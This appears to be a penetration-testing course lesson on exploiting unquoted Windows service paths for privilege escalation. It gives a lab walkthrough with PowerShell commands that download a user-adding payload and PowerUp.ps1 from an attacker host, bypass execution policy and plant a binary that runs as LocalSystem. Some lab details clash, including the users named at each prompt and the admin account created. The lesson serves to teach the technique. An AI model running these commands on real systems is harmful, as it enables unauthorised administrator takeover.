### Unquoted Service Path Vulnerability in Windows

When a service is started, and a process is created, the `CreateProcess` function in Windows is used. The first parameter of this function, `lpApplicationName`, specifies the name and, optionally, the path to the executable file. If the provided string contains spaces and is not enclosed within quotation marks, it can be interpreted in various ways, leading to ambiguity about where the file name ends and the arguments begin. The function interprets the path from left to right until a space is encountered. For each space in the file path, the function uses the preceding part as the file name by appending `.exe` and treats the rest as arguments.

#### Example: Unquoted Service Binary Path

Consider the unquoted service binary path `C:\Program Files\My Program\My Service\service.exe`. When Windows starts the service, it will attempt to locate the executable file using the following paths:

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Program\My.exe`
4. `C:\Program Files\My Program\My Service\service.exe`

This example demonstrates how Windows tries to interpret the service binary path to locate the correct executable file.

#### Exploiting the Unquoted Service Path

To exploit this vulnerability and subvert the original service call, an attacker must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename. When the service is started, the malicious file will be executed with the same privileges as the service, often the LocalSystem account, resulting in a privilege escalation attack.

In the context of the example, the attacker could:

- Name the executable `Program.exe` and place it in `C:\`.
- Name the executable `My.exe` and place it in `C:\Program Files\`.
- Name the executable `My.exe` and place it in `C:\Program Files\My Program\`.

However, the first two options would require unlikely permissions since standard users do not have write access to these directories by default. The third option is more feasible if the software's main directory has overly permissive settings.

### Practical Example

#### Step 1: Enumerate Services

Connect to the target machine (e.g., `CLIENTWK220`) as `steve` (password: `securityIsNotAnOption++++++`) via RDP. Open PowerShell and enumerate running and stopped services:

```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name, State, PathName
```

Output:
```
Name        State   PathName
----        -----   --------
...
GammaService Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```

The `GammaService` is a stopped service with an unquoted service binary path containing multiple spaces, making it potentially vulnerable.

#### Step 2: Identify Vulnerable Services

Use the WMI command-line (WMIC) utility to identify services with spaces and missing quotes in their paths:

```cmd
C:\Users\steve> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Output:
```
Name          PathName
GammaService  C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

This command lists services that are potentially vulnerable to the unquoted service path attack.

#### Step 3: Check Permissions

Verify if the user `steve` can start and stop the identified service:

```powershell
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

The output indicates that `steve` has the necessary permissions to start and stop `GammaService`.

#### Step 4: List Potential Paths

List the paths Windows will use to attempt locating the executable file of the service:

1. `C:\Program.exe`
2. `C:\Program Files\Enterprise.exe`
3. `C:\Program Files\Enterprise Apps\Current.exe`
4. `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`

#### Step 5: Check Access Rights

Use `icacls` to check access rights in the potential paths:

```powershell
PS C:\Users\steve> icacls "C:\"
PS C:\Users\steve> icacls "C:\Program Files"
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
```

The output shows that `BUILTIN\Users` has Write (`W`) permissions on the path `C:\Program Files\Enterprise Apps`.

#### Step 6: Place Malicious File

Place a malicious file named `Current.exe` in the `C:\Program Files\Enterprise Apps\` directory:

1. Download the `adduser.exe` binary from a Python web server.
2. Save it as `Current.exe` and copy it to the target directory.

```powershell
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

#### Step 7: Start the Service

Start the `GammaService` to execute the malicious `Current.exe`:

```powershell
PS C:\Users\steve> Start-Service GammaService
```

Check if the new user `dave2` was created and added to the local Administrators group:

```powershell
PS C:\Users\steve> net user
PS C:\Users\steve> net localgroup administrators
```

The output confirms that `dave2` was created and added to the local Administrators group.

### Using PowerUp to Automate Exploitation

Download and import PowerUp to automate the exploitation:

```powershell
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave> Get-UnquotedService
```

Output:
```
ServiceName : GammaService
Path : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'GammaService' -Path 
CanRestart : True
```

Use the `Write-ServiceBinary` function to exploit the unquoted service path:

```powershell
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
PS C:\Users\steve> Restart-Service GammaService
```

The output confirms that the user `john` was created and added to the local Administrators group.

### Conclusion

In this section, we covered the unquoted service path vulnerability in Windows, including how to identify and exploit it. We also demonstrated how to use PowerUp to automate the exploitation process. This vulnerability, although requiring specific conditions, is easily exploitable and a valuable privilege escalation vector to consider.

### Next Learning Unit

**Learning Objectives:**
- Leverage Scheduled Tasks to elevate our privileges
- Understand the different types of exploits leading to privilege escalation
- Abuse privileges to execute code as privileged user accounts

In the previous learning unit, we explored privilege escalation vectors related to Windows services. In the next unit, we will cover other Windows components that can be abused to elevate privileges.